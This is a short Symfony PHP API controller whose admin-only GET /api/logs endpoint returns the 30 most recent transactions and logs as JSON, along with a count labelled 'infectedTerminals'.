<?php

namespace App\Controller\Api;

use App\Controller\BaseController;
use App\Repository\LogRepository;
use App\Repository\TransactionRepository;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;

/**
 * @Route("/api")
 */
class LogController extends BaseController
{
    public function __construct(
        private TransactionRepository $transactionRepository,
        private LogRepository $logRepository
    )
    {}

    /**
     * @Route("/logs", methods={"GET"})
     */
    public function index(): Response
    {
        try {
            $this->denyAccessUnlessGranted('ROLE_ADMIN');
            $transactions = $this->transactionRepository->findAllLastTransactions(30);
            $logs = $this->logRepository->findAllLastLogs(30);

            return $this->json([
                'transactions' => $transactions,
                'logs' => $logs,
                'infectedTerminals' => count($logs)
            ]);
        } catch (\Throwable $e) {
            return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
        }
    }
}